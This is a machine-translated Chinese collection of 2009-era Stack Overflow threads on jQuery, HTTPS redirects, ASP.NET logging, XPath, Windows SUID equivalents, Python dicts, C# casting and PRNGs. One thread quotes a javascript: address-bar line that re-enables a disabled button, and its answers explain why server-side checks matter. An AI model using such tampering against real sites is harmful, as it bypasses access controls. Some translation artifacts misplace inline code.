> 时间：2009-03-16T19:17:05.533

```
$('tbody > tr', 'table.grid').filter(function() {
    return $(this).children('td').eq(1).text() == 'Open';
}).addClass('open_tr'); 
```

它在做什么：

它正在选择上下文中的所有`<tr>`元素。filter 函数允许您根据返回的内容过滤元素，true 保留或 false 丢弃。因此，在过滤器中，我们获取 tr 的所有子项，获取 2nd ，并返回其文本是否等于 'Open' - 如果是，它将返回 true，我们可以将父项保留在选择器中。剩下的就是打开状态，所以我们可以添加一个类来标记它们。`<tbody>``table.grid``<td>``<tr>``<tr>`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-16T19:18:49.460

我没有编写任何代码，因为您可以重用一些 jQuery 脚本，这些脚本允许您为表格行生成备用颜色 - 只需稍作修改。

基本上，在页面加载时（用 jQuery 术语 - 准备好文档）

1.  获取对表行的引用。
2.  遍历检查特定列的值的行。
3.  如果符合您的要求，请更改行颜色。

# http - 如何从 HTTPS 重定向到 HTTP 而不会出现烦人的错误消息

> ID：651772
> 
> 赞同：24
> 
> 时间：2009-03-16T19:15:25.740
> 
> 标签：http, redirect, https, http-status-code-302

我想在 HTTPS 登录后将用户重定向到网站上的 HTTP 页面。对整个站点使用 HTTPS 是不会发生的。

到目前为止，我有以下内容：

1.  用户将登录表单发布到安全站点
    *   安全服务器验证凭据
    *   安全服务器向客户端发送 302 重定向

这有效，除了在我的 IE6 机器上，用户会收到一条错误消息，因为默认设置是在退出安全页面时发出警告。这些错误对我来说是一个可用性杀手，因此是一个阻碍。我改变了它，所以第 3 步是

*   服务器发送带有元刷新的 html 代码

但这很慢；即使在我的本地机器上，它也明显比执行 302 重定向慢。

有没有更好的方法来实现对人们使用的标准设置进行无忧重定向的目标？IE6 占我们流量的 20%-25%。另外，有没有人知道哪些浏览器会发出警告，哪些浏览器不会发出 302 重定向警告？我正在考虑将 IE6 列入黑名单，以便只有它获得缓慢的元刷新，而其他所有人都获得快速的 302。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2010-09-24T06:22:20.513

恢复一个旧主题，但要使其完成发布以下内容，以便其他开发人员可以选择实施

在没有警告消息的情况下将 https 移动到 http 的一种方法是使用 javascript 使用客户端重定向。

脚步

1.  用户在 https 表单上输入登录详细信息，然后单击登录按钮
2.  登录按钮将发回 https 表单以进行登录验证（假设登录正确）将重定向到也在 https 下的保留页面并显示消息（请等待站点重定向您）
3.  此保留页面执行 javascript 重定向到 http 页面

不会显示浏览器警告消息

高温高压

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-03-17T05:06:35.850

> 我正在考虑将 IE6 列入黑名单，以便只有它获得缓慢的元刷新，而其他所有人都获得快速的 302。

我会做这样的事情。还在正文中包含一个纯 HTML 链接以方便访问。

请注意，其他一些浏览器确实会在离开 HTTPS 站点时发出类似的警告，但在它们的情况下，它伴随着一个（通常预先勾选）“不要再问我”按钮。因此，当他们到达您的网站时，他们几乎肯定会告诉该警告消失。这不会使警告变得毫无意义，但至少可以缓解问题。

> 3.  安全服务器向客户端发送 302 重定向

您不应该 302 响应 POST。一个认真对待 HTTP RFC 的理论浏览器可能会通过将表单重新发布到新 URL 来响应这一点。（具有讽刺意味的是，这将使 IE6 关于信息“被重新传输到非安全站点”的警告不那么具有误导性。）改为使用“303 See other”。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-03-16T19:20:49.017

我不认为有任何其他方式。该错误消息是为了用户的利益，并且现在也出现在 IE 7 和 Firefox 3 中。我知道防止它的唯一方法是将您的网站添加为浏览器中的受信任网站。

**更新：**哦，所以这不是混合内容错误。我知道你指的是哪一个，但我仍然认为你不能禁用该错误。通常，安全错误是为了保护用户免受潜在危险网站的侵害，因此，（可能不安全的）网站本身不能禁用安全错误。

# asp.net - ASP.NET 日志记录 - log4net 或健康监控？

> ID：651782
> 
> 赞同：8
> 
> 时间：2009-03-16T19:19:46.353
> 
> 标签：asp.net, logging, log4net, health-monitoring

我正在查看 3.5 中的一个全新的 asp.net 站点，它绝对没有错误处理或日志记录。记录和处理错误有哪些好的选择？我在 1.1 框架上使用过 Log4Net，但听说 3.5 中可能有更好的选择。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-03-16T19:22:41.620

一种选择是 ELMAH。我在这里问了一个问题： [ASP.NET 错误处理](https://stackoverflow.com/questions/583307/asp-net-error-handling)。

从那以后，我实现了它的一个稍微修改过的版本，并且日志和电子邮件非常好，并且很容易通过 web.config 文件集成。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2010-10-12T00:21:43.700

我们使用两个选项进行日志记录：-

用于意外异常处理的[ELMAH](http://code.google.com/p/elmah/)

[NLog](http://nlog-project.org/)用于预期的手动（调试、信息和错误）信息。

**ELMAH**是一个很棒的开箱即用插件，可以自动捕获异常（从 404（找不到页面）到抛出的 500 异常），并具有内置的 web-ui 来可视化这些错误。因此，这是一种非常快速有效的方法来捕捉发生的*意外*错误。

现在**NLog通过让我们的开发人员在特定位置手动将调试信息插入到代码中来** *补充*这一点，因此当我们需要从非本地主机系统中获取信息时，这非常容易。例如，我们`log.Debug(..)`在大多数方法中乱扔代码以查看局部变量是什么或返回值等。对于更重要的信息，我们然后使用`log.Info(..)`.. 但很少使用它。最后，对于我们捕获和处理的严重错误，我们通常在某些范围内使用`log.Error(..)`or ..。因此，在我们的测试或实时服务器上，如果我们需要获取大量数据、实时......或者只是一般的重要信息，例如状态和更大，我们会打开所有日志记录状态（例如和更大）。我们总是有`log.Warn(..)``try/catch``Debug``Info``Warn, Error and Fatal`状态始终开启。调试状态会生成大量数据，因此我们仅少量使用。

总而言之，我建议您对 WebApp 使用两种方法。Elmah 用于出色的*意外*错误捕获，NLog 用于*预期*信息和错误。

最后，NLog 比 Log4Net 更容易使用/工作。它基本上取代了它，IMO。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-03-16T19:48:37.220

如果您习惯于 log4net，请坚持您所知道的。它简单、快速且运行良好。我已经在 1.1、2.0 和现在的 3.5 中使用了多年。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-06-25T03:51:50.603

ASP.NET 健康监控实际上开箱即用，做得相当不错！

[MSDN，如何：发送电子邮件以获取健康监控通知](http://msdn.microsoft.com/en-us/library/ms227553.aspx)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-16T19:45:25.497

[Enterprise Library](http://msdn.microsoft.com/en-us/library/dd203099.aspx)可能有一个学习曲线，但它是一个很好的项目。

在 Asp.Net 中遵循 david hayden 的文章[Enterprise Library 2.0 Logging Application Block](http://www.davidhayden.com/blog/dave/archive/2006/02/15/2802.aspx)

* * *

## 回答 #6

> 赞同：-2
> 
> 时间：2010-10-12T00:10:42.320

就个人而言，我没有尝试过 log4net，但看到了 winforms 的规范和示例，但我的组织编写了我们自己的日志记录机制，用于报告和记录 global.asax 中捕获的错误，报告我们需要了解的有关堆栈跟踪、会话的所有信息（如果存在）、表单的 NVC、应用程序的版本、使用查询字符串和 HTTP 标头引发错误的 URL。尽管我注意到并非所有错误都记录在那里；例如表单身份验证过期或应用程序池重新启动/关闭或由 IIS 报告的未由应用程序执行引发的任何内容。

# gwt - 如何使用 XPath 仅选择可见元素？

> ID：651783
> 
> 赞同：57
> 
> 时间：2009-03-16T19:19:48.973
> 
> 标签：gwt, xpath, selenium

我有一个[GWT](http://code.google.com/webtoolkit/)应用程序，我正在尝试使用[Selenium](http://seleniumhq.org/)为其编写一些测试。

我正在使用 XPath 来识别页面上用于测试的元素。由于这些值是由 GWT 自动生成的并且可以更改，因此使用`id`将不起作用。`id`当我意识到我可以通过标签找到按钮时，事情开始进展顺利，如下所示：

```
//button[.='OK'] 
```

但是，当我开始运行多个测试时，我开始遇到问题。我意识到问题在于一旦由 Javascript 生成的 GWT 应用程序的所有不同“页面”都保留在 HTML 中的隐藏`<div>`元素中。这意味着我的 Selenium 测试有时会单击隐藏按钮而不是当前视图中可见的按钮。

[使用Firebug](http://getfirebug.com/)检查 HTML ，似乎 GWT`<div>`通过添加元素`display: none`的`style`属性来隐藏元素。这意味着我可以找到所有隐藏的确定按钮，如下所示：

```
//div[contains(@style,'display: none')]//button[.='OK'] 
```

这将找到所有隐藏的 OK 按钮，即具有祖先的按钮，该祖先`<div>`被隐藏`display: none`在`style`.

我的问题是：如何使用 XPath 仅查找可见的 OK 按钮？如何在 中找到没有祖先`<div>`元素`display: none`的按钮`style`？

* * *

## 回答 #1

> 赞同：70
> 
> 时间：2009-03-16T19:24:41.800

这应该有效：

```
.//button[.='OK' and not(ancestor::div[contains(@style,'display:none')])
and not(ancestor::div[contains(@style,'display: none')])] 
```

编辑：

下面更简单、更有效的表达式：

```
//div[not(contains(@style,'display:none'))]//button[.='OK'] 
```

不能正常工作，因为每个按钮至少有一个在其祖先中可见的 div。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2012-06-01T09:49:28.747

Selenium 2 Webdriver 为我们提供了处理此问题的 isDisplayed() 方法选项。硒贡献者的出色工作。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2020-08-25T21:27:43.120

这对我有用：

```
//div[[not(@hidden)] 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-03-12T12:06:45.360

`//div[(contains(@style,'display: block'))]//button[@id='buttonid']`

这对我有用。就像`'display: none'`表示隐藏块一样，`'display: block'`表示当前显示的块，我们可以指定任何内部标签来识别，如上

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-10-20T23:42:48.253

我将此代码添加到名称映射编辑器中，但它一旦出现就没有找到 Keep 按钮。系统会在编辑器中看到它，但它不想在创建包含此项目的新测试时单击该按钮。

现在另一件事是动态按钮单击，所以我将选择一个打开下拉列表的按钮，我将这些项目放置在这些下拉列表中。现在它适用于第一个项目，但下次在另一个屏幕中使用它时无法识别相同的映射项目。两个区域的按钮保持是相同的。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-11-18T16:28:06.213

对我来说，这有助于消除隐藏元素：

```
//div[@open]//* 
```

* * *

## 回答 #7

> 赞同：-4
> 
> 时间：2017-10-26T11:01:38.287

```
//div[contains(@style,'display: block')] 
```

此代码将找到可见元素 xpath

# windows - 对于基于 Unix 平台的 SUID，我在 MS Windows 平台上有哪些选择？

> ID：651787
> 
> 赞同：6
> 
> 时间：2009-03-16T19:20:27.553
> 
> 标签：windows, unix, suid

要理解我在问什么，区分 Unix 中 SUID 的几种用法很重要。

我有一个项目使用用户 PATH 中的可执行文件，该可执行文件归项目所有，并且设置了 SUID 位。这样，当它运行时，它会在文件所有者的上下文中运行，而不是在调用用户的上下文中运行。通过这种方式，它可以访问用户无法访问的内容，从而通过正常的文件系统保护来保护这些内容不受用户的影响。这工作得相当好。计划是将项目迁移到客户端-服务器架构，但这需要一些时间。同时，如何在 Windows 系统上复制这种行为？

请注意，项目的可执行文件不会调用 SETUID 库调用，但坦率地说，在我看来，考虑到项目的功能，这将是一个很棒的功能。该项目不需要系统根权限。第一个安全问题是它需要保护自己的文件不受用户（只是文件所有者以外的任何用户）的影响，如果它能够切换到“用户上下文”来访问文件，那就太好了系统就好像它是调用用户一样。（通过这种方式，它可以更容易地确定项目可以触摸什么，什么不可以。）

该项目是用 C 和 Java 结合编写的 - 带有 SUID 集的 C 程序调用 Java 代码...

我很想知道所有这些机制，并且特别关注那些：

1.  适用于 C 和 Java，并且；
2.  易于为非 Windows 程序员实现，并且；
3.  需要 Windows 独有的最少编码。

如果某些解决方案更好，请分享您在这方面所知道的任何想法。

笔记：

1.  LogonUser：需要纯文本密码。这怎么可能是答案？
2.  RunAs：需要在提示时输入密码！...与 LogonUser 一样，只会更糟；我不明白这是一个答案。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-03-16T19:40:21.983

我认为 Windows 中没有 SETUID 的等价物，但您可以以其他用户身份启动进程。如果您使用的是 C，那么您实际上只需要研究两个主要的 Windows 特定功能：

[登录用户](http://msdn.microsoft.com/en-us/library/aa378184(VS.85).aspx)

[CreateProcessAsUser](http://msdn.microsoft.com/en-us/library/ms682429(VS.85).aspx)

这些功能的文档非常好，所以它不应该是那么大的挑战。基本上，您将使用 LogonUser 模拟用户，然后使用 CreateProcessAsUser 以该用户身份启动 JVM。

您也可以查看[RUNAS](http://www.ss64.com/nt/runas.html)命令，但我不确定这是否能满足您的需求。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-12T00:16:53.133

Cygwin 对他们如何在不需要用户密码的情况下执行此操作进行了很好的讨论：[在 Cygwin 中使用 Windows 安全性](http://www.cygwin.com/cygwin-ug-net/ntsec.html#ntsec-nopasswd1)

基本上，他们安装了一个自定义 LSA 身份验证包，该包无需密码即可提供安全令牌。作为后备，当未安装身份验证包时，它们使用未记录的 NtCreateToken API。

想要模拟的应用程序可以在调用 java.util 之前进行 cygwin setuid 调用。

# python - 在 Python 中初始化 dicts 的最佳方法是什么？

> ID：651794
> 
> 赞同：87
> 
> 时间：2009-03-16T19:22:51.837
> 
> 标签：python, autovivification

很多时候在 Perl 中，我会做这样的事情：

```
$myhash{foo}{bar}{baz} = 1 
```

我如何将它翻译成 Python？到目前为止，我有：

```
if not 'foo' in myhash:
    myhash['foo'] = {}
if not 'bar' in myhash['foo']:
    myhash['foo']['bar'] = {}
myhash['foo']['bar']['baz'] = 1 
```

有没有更好的办法？

* * *

## 回答 #1

> 赞同：120
> 
> 时间：2009-03-16T21:29:44.153

如果您需要的嵌套数量是固定的，那就`collections.defaultdict`太好了。

例如嵌套两个深：

```
myhash = collections.defaultdict(dict)
myhash[1][2] = 3
myhash[1][3] = 13
myhash[2][4] = 9 
```

如果您想进行另一层嵌套，您需要执行以下操作：

```
myhash = collections.defaultdict(lambda : collections.defaultdict(dict))
myhash[1][2][3] = 4
myhash[1][3][3] = 5
myhash[1][2]['test'] = 6 
```

编辑：MizardX 指出我们可以通过一个简单的函数获得完整的通用性：

```
import collections
def makehash():
    return collections.defaultdict(makehash) 
```

现在我们可以这样做：

```
myhash = makehash()
myhash[1][2] = 4
myhash[1][3] = 8
myhash[2][5][8] = 17
# etc 
```

* * *

## 回答 #2

> 赞同：108
> 
> 时间：2009-03-16T19:45:34.013

```
class AutoVivification(dict):
    """Implementation of perl's autovivification feature."""
    def __getitem__(self, item):
        try:
            return dict.__getitem__(self, item)
        except KeyError:
            value = self[item] = type(self)()
            return value 
```

测试：

```
a = AutoVivification()

a[1][2][3] = 4
a[1][3][3] = 5
a[1][2]['test'] = 6

print a 
```

输出：

```
{1: {2: {'test': 6, 3: 4}, 3: {3: 5}}} 
```

* * *

## 回答 #3

> 赞同：15
> 
> 时间：2009-03-16T19:56:21.773

是否有理由需要成为字典的字典？如果该特定结构没有令人信服的理由，您可以简单地使用元组索引 dict：

```
mydict = {('foo', 'bar', 'baz'):1} # Initializes dict with a key/value pair
mydict[('foo', 'bar', 'baz')]      # Returns 1

mydict[('foo', 'unbar')] = 2       # Sets a value for a new key 
```

如果使用元组键初​​始化 dict，则需要括号，但在使用 [] 设置/获取值时可以省略它们：

```
mydict = {}                        # Initialized the dict
mydict['foo', 'bar', 'baz'] = 1    # Sets a value
mydict['foo', 'bar', 'baz']        # Returns 1 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-03-16T19:28:00.373

我猜直译应该是：

```
 mydict = {'foo' : { 'bar' : { 'baz':1}}} 
```

来电：

```
 >>> mydict['foo']['bar']['baz'] 
```

给你1。

不过，这对我来说看起来有点恶心。

（不过，我不是 perl 人，所以我猜你的 perl 做了什么）

# flash - 通过 Web 为 Intranet 解决方案录制音频

> ID：651796
> 
> 赞同：6
> 
> 时间：2009-03-16T19:23:07.047
> 
> 标签：flash, audio, audio-recording, voice-recording

什么是通过网页录制音频的最佳（最便宜、最开放）的方式。然后将该录音保存为 MP3 格式，并通过唯一的 ID/URL 使其可用。

我想基于 Flash 的插件会是最好的。我正在考虑类似 Odeo 的东西，但这仅适用于 Intranet。我不能依赖和公开 URL 或服务。

我正在寻找可以从现有组件（开源）项目中拼凑起来的东西。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-17T00:42:51.007

您需要一个服务服务器端来录制音频，这可以托管在您网络的一台机器上（除非您是通过 AIR 为每台计算机本地执行此操作）。

Adobe 的 FMS 提供了录制和播放流的选项。

但首先，您应该看看**Red5**，它是一种替代免费服务：

[http://www.red5.org/](http://www.red5.org/)

他们的网站上有示例，您也可以在 google 上找到一些示例。这是一个：

[http://fms.denniehoopingarner.com/](http://fms.denniehoopingarner.com/)

**下面是关于使用 AIR 进行本地录制**的快速教程：

[http://seeing-is-believing.blogspot.com/2008/05/capture-and-write-audio-stream-with.html](http://seeing-is-believing.blogspot.com/2008/05/capture-and-write-audio-stream-with.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-06-22T15:18:47.013

糟糕的是，Adobe 把 DIrector 搞砸了。我曾经很快做到这一点（使用Director SHockwave和适当的xtra（额外的100美元插件）在网页上录制完整的44 000 wav / 16位的audio......太糟糕了，事情变得如此困难as3...（但是是的，好的，更干净，更高效）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-16T20:38:12.950

以下是在 Flash 中使用麦克风的教程：

> [http://www.kirupa.com/developer/actionscript/microphone.htm](http://www.kirupa.com/developer/actionscript/microphone.htm)

记录 Flash Microphone 对象：

> [http://www.adobe.com/support/flash/action_scripts/actionscript_dictionary/actionscript_dictionary479.html](http://www.adobe.com/support/flash/action_scripts/actionscript_dictionary/actionscript_dictionary479.html)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-03-04T18:19:58.257

我也一直在寻找，到目前为止我发现的最有希望的是 Red5 加上来自 [http://fms.denniehoopingarner.com/](http://fms.denniehoopingarner.com/)的提示 ......自从这个问题在这里被问到后，这些工具已经发展了多少2009 年？浏览器音频 API 也在路上，但似乎主流用户需要 Flash（和/或 Java？）。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-05-15T01:09:08.850

在浏览器中录制的替代方法是要求用户上传他们从另一个应用程序录制的文件。那里有各种各样的可用性问题，但这可能是在 2009 年完成这项工作的最直接的方法。

我最近与一位 Flash 开发者朋友讨论了这个问题，看看是否有一些解决方案只使用 Flash 和不依赖于 Red5 或 FMS 的标准 Web 服务器工具包，他建议实际上可能使用 Flash 10。这给了我一个[我在这里更加充实的](http://bkendall.biz/2009/05/recording-web-audio/)想法。有人愿意帮忙并实现这一目标，还是这是不可能的？

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-03-16T20:22:20.727

您不能使用网页录制音频，但如果由于某种原因您需要嵌入录音桌面应用程序（如您所说，使用某种插件），那么 Java 小程序可能是最好的/最简单的方法。自定义插件/扩展会更好，但更难，除非已经有（可能有）。

您可能还应该重新考虑为此使用网页。你并没有真正给你要求，所以我不能说，但使用网络应用程序而不是你的网络浏览器可能会好得多:)

# c# - 为什么我遇到名称冲突

> ID：651803
> 
> 赞同：2
> 
> 时间：2009-03-16T19:25:24.263
> 
> 标签：c#, asp.net

我们有一个我们使用的网络服务框架；我没有参与创建并且没有修改的能力，这基本上需要千篇一律的代码来向框架添加一个“模块”。代码格式示例如下。

在下面的示例中，我将这个`Helper`类添加到几个月后的每个类中，却没有意识到我有两个名称相同的类。代码编译得很好，但是当部署到 Web 服务器时会产生运行时错误。每当 Processor_ProcessCompleted 事件处理程序中的任何一个被命中时，它都会抛出一个无效的强制转换异常，说明`Helper`无法将 type 的对象强制转换为 type `Helper`。

我理解这个错误，并且已经通过重新分解`Helper`课程来纠正这种情况。这些辅助类永远不会在它们自己的类之外的任何地方被引用，它们是私有子类，它们位于不同的命名空间中，并且任何命名空间都不会以任何方式引用另一个命名空间。我的问题是：为什么会发生这种碰撞？

显然，我是不正确的，但我认为仅仅将它们声明为私有和内部（不要与它们的父类混淆`internal`）的行为就会使它们免受所有冲突的可能性。

```
 namespace NameSpace1
{
  public class Client1
  {
    Processor processor;

    private class Helper
    {
      public Property1 { get; set; }
      public Property2 { get; set; }
    }

    public Client1(Processor p)
    {
      processor = p;
      processor.ProcessCompleted += Processor_ProcessCompleted;
    }

    void Processor_Process(object sender, ProcessCompletedEventArgs e)
    {
      Helper helper = (Helper)e.UserState;
      // ... do a bunch of stuff
    }
  }
}

namespace NameSpace2
{
  public class Client2
  {
    Processor processor;

    private class Helper
    {
      public Property1 { get; set; }    
    }

    public Client2(Processor p)
    {
      processor = p;
      processor.ProcessCompleted += Processor_ProcessCompleted;
    }

    void Processor_Process(object sender, ProcessCompletedEventArgs e)
    {
      Helper helper = (Helper)e.UserState;
      // ... do a bunch of stuff
    }
  }
} 
```

**Re Jon Skeet：** Jon，感谢您的回复。在这种情况下，所有客户端都使用相同的处理器。他们都将他们的事件处理程序分配给事件。我明白你在说什么，但是由于强制转换发生在特定方法的上下文中，似乎它应该能够从方法的上下文中推断出特定的类型。

至于助手的分配，处理器本身从不真正查看它填充到 EventArgs 中的内容。它只是一个`object`处理器。异步调用如下所示：

```
 processor.Process(request, helper); 
```

并且它发生在试图在响应中强制转换它的同一个类中。帮助程序仅包含服务用来确定执行路径的一些简单数据。

**编辑以解决乔恩的编辑：** 乔恩，我现在认为我看到了问题。该框架的设计者专门设计它以允许所有客户端使用相同的处理器。因此，我认为您对于为所有订阅客户端触发的事件是完全正确的。事实上，使用客户端的人正在编写这样的代码：

```
 Processor processor = new Processor();
Client1 client1 = new Client1(processor);
Client2 client2 = new Client2(processor);

client1.ExecuteSomeRequest(); // calls processor.Process(request, helper);
client2.ExecuteSomeOtherRequest(); // calls processor.Process(request, helper); 
```

我感谢勤奋而全面的回答。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-16T19:29:26.190

不，仍然存在明显的冲突可能性 - 因为两个客户端最终都可以将事件处理程序添加到相同的`Processor`，至少使用您提供的代码。然后两者都将尝试投射`e.UserState`到`Helper`并且只有其中一个是正确的。设置 的含义是什么`UserState`，以及如何知道将其`Helper`设置为哪种？你确定你永远不会把同样的东西传递给一个`Process`以上的人`Client`吗？

编辑：响应您的编辑 - 如果所有客户端都使用相同的处理器，那么他们肯定都会订阅相同的事件，这可能不是您想要的。

至于关于 UserState 的一点 - 你已经解释过它被称为`processor.Process(request, helper);`但谁在打电话，确切的类型是`helper`什么？

I *suspect* the problem is due to you reusing the same processor object, so previous clients are still having their event handler fired even with a new client, but it's hard to know without the complete picture.

If you could produce a short but complete program demonstrating the problem, that would help.

# jasper-reports - JasperReports 交叉表查询

> ID：651817
> 
> 赞同：1
> 
> 时间：2009-03-16T19:28:07.207
> 
> 标签：jasper-reports, crosstab

我正在使用*JasperReports* \ *iReport*交叉表来创建学生和结果矩阵。

例如，Jim 正在做 A、B、C 科目，而 Sally 正在做 A、C

我想要的是这样的：

```
 Subj-A   Subj-B   Subj-C
Jim          P        M        D
Sally        D                 D 
```

但是当我的 SQL 按名称排序时，我得到：

```
 Subj-A   Subj-B   Subj-C   Subj-A   Subj-C
Jim          P        M        D        
Sally                                   D        D 
```

正如您在上面看到的，结果是正确的，但格式很糟糕。无论如何我可以生成报告以仅使用名称和主题一次并从此处填写值吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-12-14T14:43:14.387

对此进行跟进。

JasperReports 主要用于表示数据，所以这里的工作需要通过 SQL 来完成。

在存在 X 与 Y 的交叉表的情况下，我们可能需要使用交叉连接来计算 X 学科和 Y 学生的所有组合。

在交叉连接之后，我们可以对候选详细信息使用外连接来查找结果。在此之后，这是 Jasper 中表示的基本问题。

# javascript - 防止 JavaScript 注入

> ID：651819
> 
> 赞同：1
> 
> 时间：2009-03-16T19:28:36.503
> 
> 标签：javascript, vb.net, security, javascript-injection

在 VB.NET Web 应用程序中防止 javascript 注入的最佳方法是什么？是否有某种方法可以在页面加载事件中禁用 javascript？

最近，我们的 vb.net 产品的部分安全计划是简单地禁用特定用户无法使用的页面上的按钮。然而，我告诉那个想到打字的人

`javascript:alert(document.getElementById("Button1").disabled="")`

在地址栏中将重新启用该按钮。我确信其他人以前遇到过这样的问题，所以任何帮助表示赞赏。谢谢！

**更新：** 除了验证用户输入，我怎样才能保护网站不被地址栏玩弄？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2009-03-16T19:32:34.997

您对应用程序的客户端行为所做的任何更改都是肤浅的，根本不安全。你不应该依赖这些。它们很好地阻止了 99% 的用户，但绕过它们却很容易。您应该在调用操作时检查用户是否对服务器端的操作具有正确的权限，这样如果有人决定自己重新启用按钮，他们将无法执行按钮的任何用途做。你无法控制别人可以用 javascript 对页面做什么，所以你永远不应该相信来自客户端的任何东西。

**对更新的回应：**你不能以任何实际的方式，这正是问题所在。一旦网站在他们的浏览器中，它就是免费的，他们可以尝试一下。这就是为什么您的程序应该每次都验证服务器端的所有内容。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-03-16T19:31:05.157

要考虑的最重要的项目是对用户输入进行 html 编码。如果用户输入 <script> 它将被转换为 <script> 等等

**更新：**如果期望来自 url / 查询字符串的输入，请使用极端措施验证数据。如果可能，将收到的数据列入白名单。当列入白名单时，您确保只有您认为正确和安全的内容才是可行的提交。

永远不要相信用户的输入。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-03-16T19:31:14.547

始终验证用户输入。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-03-16T19:33:48.190

永远不要相信来自客户的数据。**始终在您**可以控制的服务器端验证数据和权限。请记住，用户（或任何其他应用程序）可以向您发送他们想要的任何数据。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-03-16T19:36:52.177

不管你做什么来通过javascript锁定界面，你的数据总是可以以某种方式被操纵。有多种工具，例如[fiddler](http://www.fiddlertool.com/fiddler/)，可用于修改或重新创建回发/请求。

即使您找到了锁定事物的方法，如果您的数据对攻击者足够重要，那么您也处于军备竞赛中。最可行的选择是验证您的输入服务器端。

# c++ - C++ STL 中的确定性随机数流

> ID：651834
> 
> 赞同：8
> 
> 时间：2009-03-16T19:32:06.497
> 
> 标签：c++, stl, random

我想提供一个数字，然后接收一组随机数。但是，无论我在哪台计算机上运行它，我都希望这些数字相同（假设我提供相同的种子）。

基本上我的问题是：在 C++ 中，如果我使用`rand()`，但提供`srand()`用户定义的种子而不是当前时间，我是否能够在任何计算机上生成相同的随机数流？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-03-16T19:34:24.260

有许多[PRNG](http://en.wikipedia.org/wiki/Pseudorandom%5Fnumber%5Fgenerator)可用作库。选一个。我倾向于使用[Mersenne Twister](http://en.wikipedia.org/wiki/Mersenne_twister)。

通过使用外部提供的库，您可以绕过语言库的怪异或错误实现的风险`rand()`。只要您的平台都符合相同的数学语义，您就会得到一致的结果。

MT 是我的最爱，因为我是一名物理学家，我将这些东西用于蒙特卡洛，在蒙特卡洛，保证高维均匀分布很重要。但*不要将 MT 用作加密 PRNG！*

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-03-16T19:38:52.267

`srand()`&`rand()`不是 STL 的一部分。它们实际上是 C 运行时的一部分。是的，只要是相同的实现，它们就会产生相同的结果`srand()/rand()`。

根据您的需要，您可能需要考虑使用[Boost.Random](http://www.boost.org/doc/libs/1_38_0/libs/random/index.html)。它提供了几个高质量的随机数生成器。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-03-16T19:33:59.237

假设的实现`rand()`是相同的，是的。

确保这一点的最简单方法是在您的程序中包含一个已知的 rand() 实现 - 可以包含在项目的源代码中，也可以以您可以管理的库的形式包含。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-03-16T19:50:26.717

不，ANSI C 标准*仅*规定`rand()`必须产生一个介于 0 和 RAND_MAX 之间的随机整数流，该流必须至少为 32767（[来源](http://members.cox.net/srice1/random/crandom.html)）。这个流必须是确定性的，对于给定机器上的给定实现，它必须在给定相同种子的情况下产生相同的整数流。

你想要一个便携式 PRNG。 [Mersenne Twister](http://en.wikipedia.org/wiki/Mersenne_twister)（许多实现链接在底部）非常便携，[Ben Pfaff 的本土 C99 兼容 PRNG](http://www.stanford.edu/~blp/writings/clc/random.html)也是如此。 [Boost.Random](http://www.boost.org/doc/libs/1_38_0/libs/random/index.html)也应该没问题；当您使用 C++ 编写代码时，使用 Boost 不会限制您对平台的选择（尽管一些“较小”（即不兼容的）编译器可能会因大量使用模板元编程而遇到问题）。这只是小批量嵌入式平台和也许是新颖的研究架构的真正问题，所以如果“任何计算机”是指“GCC 所针对的任何 x86/PPC/ARM/SPARC/Alpha/etc. 平台”，任何上面应该做的很好。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-03-16T19:38:27.197

编写您自己的伪随机数例程。互联网上记录了很多算法，并且它们有许多应用程序 rand 不够好（例如[Perlin Noise](http://freespace.virgin.net/hugo.elias/models/m_perlin.htm)）。

尝试以下链接作为初学者：

[http://en.wikipedia.org/wiki/Linear_congruential_generator](http://en.wikipedia.org/wiki/Linear_congruential_generator)

[http://en.wikipedia.org/wiki/Pseudorandom_number_generator](http://en.wikipedia.org/wiki/Pseudorandom_number_generator)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-03-16T19:34:22.230

我相信如果您提供具有相同种子的 srand，您将获得相同的结果。就伪随机数生成器而言，这几乎就是种子的定义。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-03-16T19:35:36.533

是的。对于给定的种子（起始值），rand() 返回的数字序列将始终相同。

# jquery - 感知与某些 div 的接近度

> ID：651842
> 
> 赞同：0
> 
> 时间：2009-03-16T19:34:41.480
> 
> 标签：jquery

我想知道 jQuery 是否有可能有一个 div。然后你越接近它向上移动一定量，所以使用CSS“顶部”。jquery 是否可以用我的图像感知鼠标位置。我会在这里使用它：[http](http://ryancoughlin.com/hp/index.php) ://ryancoughlin.com/hp/index.php - 左上角的蜘蛛。

